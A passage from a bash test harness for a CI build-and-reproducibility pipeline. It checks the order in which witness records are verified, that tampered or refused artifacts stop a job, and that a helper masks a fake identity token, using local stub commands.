    assert re.fullmatch(r"[a-z0-9-]+", k), k
    assert isinstance(v, str) and re.fullmatch(r"sha256:[0-9a-f]{64}", v), v
amap = {"amd64": "x86_64", "arm64": "aarch64"}
for k, v in j.items():                         # the same logical digest in both files
    if k.startswith("image-"): assert it[k] == v, k
    else:
        _, var, a = k.split("-"); assert it["apk-%s-%s" % (var, amap[a])] == v, k
assert len(it) == 25, len(it)
PY
    then ok "AC9 $tag assemble: digests.json passes PR 1's schema and equals items.json for the same logical digests"; else bad "AC9 $tag assemble: digests.json off-schema or unequal to items.json"; fi
    rm -rf "$d"; mk "$d" assemble "$S_assemble" "$mode" > /dev/null; rc=$(run_stage "$d" assemble ITEMS_MODE=$mode FAKE_VERIFY_RC=1); calls=$(cat "$d/calls.log")
    [ "$rc" != 0 ] && ! grep -q '^image ' <<< "$calls" && [ ! -e "$d/digests.json" ] && ok "AC3 $tag assemble: a refused apk record stops the job before any image" || bad "AC3 $tag assemble: refused record -> rc=$rc calls=$(tr '\n' '|' <<< "$calls" | cut -c1-160)"
    rm -rf "$d"; mk "$d" assemble "$S_assemble" "$mode" > /dev/null; printf 'tampered' >> "$d/apk-in/ubuntu-24.04-arm/aarch64/fscache-0.3.0-r0.apk"; rc=$(run_stage "$d" assemble ITEMS_MODE=$mode); calls=$(cat "$d/calls.log")
    [ "$rc" != 0 ] && ! grep -q '^image ' <<< "$calls" && [ ! -e "$d/digests.json" ] && ok "AC3 $tag assemble: an apk whose bytes differ from the verified record stops the job before any image (rule 58)" || bad "AC3 $tag assemble: tampered apk -> rc=$rc calls=$(tr '\n' '|' <<< "$calls" | cut -c1-160)"
    rm -rf "$d"; mk "$d" assemble "$S_assemble" "$mode" > /dev/null; rc=$(run_stage "$d" assemble ITEMS_MODE=$mode FAKE_IMAGE_RC=4)
    [ "$rc" != 0 ] && [ ! -e "$d/digests.json" ] && [ ! -e "$d/items.json" ] && ok "AC6 $tag assemble: assemble-image.sh failing (exit 4) leaves no digests.json" || bad "AC6 $tag assemble: image failure -> rc=$rc, digests.json present=$([ -e "$d/digests.json" ] && echo yes || echo no)"
  fi
  # ---- rebuild-apk and rebuild-assemble
  if [ ! -f "$S_rebuild_apk" ] || [ ! -f "$S_rebuild_assemble" ]; then
    beh_missing "$tag" "005-AC2 $tag rebuild-apk: Build's record is verified FIRST, then the same builds with the same date" "005-AC2 $tag rebuild-apk: a refused Build record runs no build" \
      "005-AC2 $tag rebuild-assemble: records verified, stage-start, binds, images, merge, compare in that order" "005-AC3 $tag rebuild-assemble: an identical rebuild writes an equal verdict" \
      "005-AC3 $tag rebuild-assemble: a differing Build item blocks the job and the verdict names it" "005-AC2 $tag rebuild-assemble: a refused record stops the job before any image"
  else
    d="$work/t-$tag-rba"; mk "$d" rebuild-apk "$S_rebuild_apk" "$mode" > /dev/null; rc=$(run_stage "$d" rebuild-apk ITEMS_MODE=$mode); calls=$(cat "$d/calls.log")
    ns=$(nth "$d" '^verify stage-start'); nb=$(nth "$d" '^apk ')
    [ "$rc" = 0 ] && [ -n "$ns" ] && [ -n "$nb" ] && [ "$ns" -lt "$nb" ] && [ "$(grep -c 'SDE=1700000000' <<< "$calls")" = 2 ] && ok "005-AC2 $tag rebuild-apk: Build's record is verified FIRST, then the same builds with the same date" || bad "005-AC2 $tag rebuild-apk: rc=$rc stage-start=$ns build=$nb"
    rm -rf "$d"; mk "$d" rebuild-apk "$S_rebuild_apk" "$mode" > /dev/null; rc=$(run_stage "$d" rebuild-apk ITEMS_MODE=$mode FAKE_VERIFY_RC=1); calls=$(cat "$d/calls.log")
    [ "$rc" != 0 ] && ! grep -q '^apk ' <<< "$calls" && ok "005-AC2 $tag rebuild-apk: a refused Build record runs no build" || bad "005-AC2 $tag rebuild-apk: refused record -> rc=$rc calls=$calls"
    d="$work/t-$tag-rbs"; mk "$d" rebuild-assemble "$S_rebuild_assemble" "$mode" > /dev/null; rc=$(run_stage "$d" rebuild-assemble ITEMS_MODE=$mode); calls=$(cat "$d/calls.log")
    n1=$(nth "$d" '^verify verify '); n2=$(nth "$d" '^verify stage-start'); n3=$(nth "$d" '^verify bind '); n4=$(nth "$d" '^image '); n5=$(nth "$d" '^verify items-merge'); n6=$(nth "$d" '^verify rebuild-compare')
    if [ "$rc" = 0 ] && [ -n "$n1" ] && [ -n "$n6" ] && [ "$n1" -lt "$n2" ] && [ "$n2" -lt "$n3" ] && [ "$n3" -lt "$n4" ] && [ "$n4" -lt "$n5" ] && [ "$n5" -lt "$n6" ]; then ok "005-AC2 $tag rebuild-assemble: records verified, stage-start, binds, images, merge, compare in that order"; else bad "005-AC2 $tag rebuild-assemble: rc=$rc order=$n1 $n2 $n3 $n4 $n5 $n6"; fi
    [ "$rc" = 0 ] && jq -e '.equal == true' "$d/witness-rebuild/verdict.json" > /dev/null 2>&1 && ok "005-AC3 $tag rebuild-assemble: an identical rebuild writes an equal verdict" || bad "005-AC3 $tag rebuild-assemble: rc=$rc verdict=$(head -c 120 "$d/witness-rebuild/verdict.json" 2> /dev/null)"
    rm -rf "$d"; mk "$d" rebuild-assemble "$S_rebuild_assemble" "$mode" > /dev/null
    python3 - "$d/build-in/items.json" <<'PY'
import json, sys
p = sys.argv[1]; d = json.load(open(p)); k = "image-fips"; d[k] = d[k][:-1] + ("0" if d[k][-1] != "0" else "1"); json.dump(d, open(p, "w"))
PY
    rc=$(run_stage "$d" rebuild-assemble ITEMS_MODE=$mode)
    [ "$rc" != 0 ] && jq -e '.equal == false' "$d/witness-rebuild/verdict.json" > /dev/null 2>&1 && grep -q 'image-fips' "$d/stage.err" "$d/witness-rebuild/verdict.json" && ok "005-AC3 $tag rebuild-assemble: a differing Build item blocks the job and the verdict names it" || bad "005-AC3 $tag rebuild-assemble: differing item -> rc=$rc"
    rm -rf "$d"; mk "$d" rebuild-assemble "$S_rebuild_assemble" "$mode" > /dev/null; rc=$(run_stage "$d" rebuild-assemble ITEMS_MODE=$mode FAKE_VERIFY_RC=1); calls=$(cat "$d/calls.log")
    [ "$rc" != 0 ] && ! grep -q '^image ' <<< "$calls" && ok "005-AC2 $tag rebuild-assemble: a refused record stops the job before any image" || bad "005-AC2 $tag rebuild-assemble: refused record -> rc=$rc"
  fi
done
# ---- bin/witnessed.sh RUN against a fake witness, curl and timeout (REQ-CHAIN-004-AC2: the wrapped command is bounded, a failure leaves no record) -----
# The fake timeout enforces FAKE_TIMEOUT_SECONDS (a short test limit) and logs the limit it was given: the helper must give 540; the fake witness runs the
# command after `--` and writes the -o record only when it succeeded (what the real Witness does: no record for a failed command).
mk_helper() { # mk_helper DIR HELPER
  rm -rf "$1"; mkdir -p "$1/bin" "$1/fake" "$1/tmp"; cp "$2" "$1/bin/witnessed.sh"
  printf '#!/usr/bin/env bash\necho "wrapped $*" >> calls.log\n[ -z "${SLEEP:-}" ] || sleep "$SLEEP"\necho "{}" > digests.json\nexit "${WRAPPED_RC:-0}"\n' > "$1/bin/wrapped.sh"
  printf '#!/usr/bin/env bash\necho "witness $*" >> calls.log\no=; a=("$@"); i=0\nwhile [ $i -lt ${#a[@]} ]; do [ "${a[$i]}" = -o ] && o=${a[$((i+1))]}; [ "${a[$i]}" = -- ] && break; i=$((i+1)); done\n"${a[@]:$((i+1))}"; rc=$?\n[ $rc = 0 ] || exit $rc\nmkdir -p "$(dirname "$o")"; echo "{\\"record\\":true}" > "$o"\n' > "$1/fake/witness"
  printf '#!/usr/bin/env bash\necho curl >> calls.log\no=; while [ $# -gt 0 ]; do [ "$1" = -o ] && o=$2; shift; done\nprintf "{\\"value\\":\\"FAKE-JWT-TOKEN-VALUE\\"}" > "$o"\n' > "$1/fake/curl"
  printf '#!/usr/bin/env bash\necho "timeout $1" >> calls.log\nshift\n"$@" & pid=$!\n( sleep "${FAKE_TIMEOUT_SECONDS:-2}"; kill "$pid" 2> /dev/null ) & killer=$!\nwait "$pid"; rc=$?; kill "$killer" 2> /dev/null; exit $rc\n' > "$1/fake/timeout"
  chmod +x "$1"/bin/* "$1"/fake/*
}
hrun() { # hrun DIR STEP [ENV=VAL...] -> the exit status of `bash bin/witnessed.sh STEP bin/wrapped.sh`
  local d=$1 s=$2; shift 2; (cd "$d" && env "$@" PATH="$d/fake:$PATH" RUNNER_TEMP="$d/tmp" ACTIONS_ID_TOKEN_REQUEST_TOKEN=SENTINEL-BEARER ACTIONS_ID_TOKEN_REQUEST_URL="https://pipelines.example/x?a=1" \
    bash bin/witnessed.sh "$s" bin/wrapped.sh > helper.out 2> helper.err; echo $?)
}
command -v jq > /dev/null || { echo "FAIL jq is required"; exit 1; }
for tag in fixture real; do
  if [ "$tag" = fixture ]; then hs="$work/witnessed.sh"; else hs="$root/bin/witnessed.sh"; fi
  if [ ! -f "$hs" ]; then
    for l in "the wrapped command runs through witness with timeout 540 and the record is written" "a command that outlives the (test) timeout fails the job and leaves no record and no digests.json" \
             "a failing command fails the job and leaves no record" "an unknown step name exits 2 before witness is called" "the identity token appears only in the add-mask line"; do bad "AC2 $tag helper: $l (bin/witnessed.sh does not exist: RED until implemented)"; done
    continue
  fi
  d="$work/h-$tag"; mk_helper "$d" "$hs"; rc=$(hrun "$d" apk); calls=$(cat "$d/calls.log" 2> /dev/null || true)
  if [ "$rc" = 0 ] && [ -f "$d/witness-apk/apk-collection.json" ] && grep -Fq -- '--step apk' <<< "$calls" && grep -Fq -- '-- timeout 540 bash bin/wrapped.sh' <<< "$calls" && grep -Fxq 'timeout 540' <<< "$calls"; then ok "AC2 $tag helper: the wrapped command runs through witness with timeout 540 and the record is written"; else bad "AC2 $tag helper: rc=$rc calls=$(tr '\n' '|' <<< "$calls" | cut -c1-200)"; fi
  mk_helper "$d" "$hs"; rc=$(hrun "$d" apk SLEEP=6 FAKE_TIMEOUT_SECONDS=1)
  if [ "$rc" != 0 ] && [ ! -e "$d/witness-apk/apk-collection.json" ] && [ ! -e "$d/digests.json" ]; then ok "AC2 $tag helper: a command that outlives the (test) timeout fails the job and leaves no record and no digests.json"; else bad "AC2 $tag helper: slow command -> rc=$rc, record=$([ -e "$d/witness-apk/apk-collection.json" ] && echo yes || echo no), digests.json=$([ -e "$d/digests.json" ] && echo yes || echo no)"; fi
  mk_helper "$d" "$hs"; rc=$(hrun "$d" apk WRAPPED_RC=3)
  [ "$rc" != 0 ] && [ ! -e "$d/witness-apk/apk-collection.json" ] && ok "AC2 $tag helper: a failing command fails the job and leaves no record" || bad "AC2 $tag helper: failing command -> rc=$rc"
  mk_helper "$d" "$hs"; rc=$(hrun "$d" evil); calls=$(cat "$d/calls.log" 2> /dev/null || true)
  [ "$rc" = 2 ] && ! grep -q '^witness ' <<< "$calls" && ok "AC2 $tag helper: an unknown step name exits 2 before witness is called" || bad "AC2 $tag helper: unknown step -> rc=$rc calls=$calls"
  mk_helper "$d" "$hs"; rc=$(hrun "$d" apk); n=$(cat "$d/helper.out" "$d/helper.err" | grep -c 'FAKE-JWT-TOKEN-VALUE' || true)
  if [ "$n" = 1 ] && cat "$d/helper.out" "$d/helper.err" | grep 'FAKE-JWT-TOKEN-VALUE' | grep -q '^::add-mask::' && ! cat "$d/helper.out" "$d/helper.err" | grep -q SENTINEL-BEARER; then ok "AC2 $tag helper: the identity token appears only in the add-mask line and the bearer value is never printed"; else bad "AC2 $tag helper: token printed $n times or the bearer leaked"; fi
done
# the harness itself can fail: a script that ignores a refused admission is visible to the behaviour harness (a control)
d="$work/t-ctl"; sed -e 's#^\(python3 bin/build-admit\.py run\)$#\1 || true#' "$work/s-apk.sh" > "$work/ctl-stage.sh"
mk "$d" apk "$work/ctl-stage.sh" oracle > /dev/null; rc=$(run_stage "$d" apk ITEMS_MODE=oracle FAKE_ADMIT_RC=1)
if [ "$rc" = 0 ] || grep -q '^apk ' "$d/calls.log" 2> /dev/null; then ok "control: a script that ignores a refused admission is visible to the behaviour harness (exit $rc, a build ran)"; else bad "control: the ignoring script was NOT visible to the behaviour harness (exit $rc)"; fi
# ---- the real repository -------------------------------------------------------------------------------------------------------------
RAL="$root/.github/policy/allowed-actions.json"
expect ok "AC1/AC2 the real stage-build.yml is exactly the Build grammar" "" stage "$root/.github/workflows/stage-build.yml" build "$RAL"
expect ok "005-AC1/AC4 the real stage-reproducibility.yml is exactly the Rebuild grammar" "" stage "$root/.github/workflows/stage-reproducibility.yml" rebuild "$RAL"
for k in apk assemble rebuild-apk rebuild-assemble; do
  expect ok "AC3/005-AC2 the real bin/build-stage-$k.sh is exactly the grammar" "" script "$root/bin/build-stage-$k.sh" "$k"
done
expect ok "AC3 the four real scripts are rows of .github/policy/chain-scripts.json with their sha256" "" listed "$root/.github/policy/chain-scripts.json" "$root"
expect ok "005-AC5 the real release.yml chain jobs" "" graph "$root/.github/workflows/release.yml"
expect ok "AC11/005-AC6 the real Build and Rebuild assemble scripts agree and the real stage files do not name apko" "" lockflow "$root/bin/build-stage-assemble.sh" "$root/bin/build-stage-rebuild-assemble.sh" "$root/.github/workflows/stage-build.yml" "$root/.github/workflows/stage-reproducibility.yml"
[ ! -e "$root/.github/workflows/stage-image.yml" ] && [ ! -e "$root/.github/workflows/stage-admission.yml" ] && ok "AC1 stage-image.yml and stage-admission.yml are gone (rules 50, 61)" || bad "AC1 stage-image.yml / stage-admission.yml still exist (RED until PR 2)"
EXPECT=276
echo "pass=$pass fail=$failn"
if [ $((pass + failn)) != "$EXPECT" ]; then echo "FAIL case count $((pass + failn)) != expected $EXPECT (a case was skipped or added)"; exit 1; fi
[ "$failn" = 0 ]
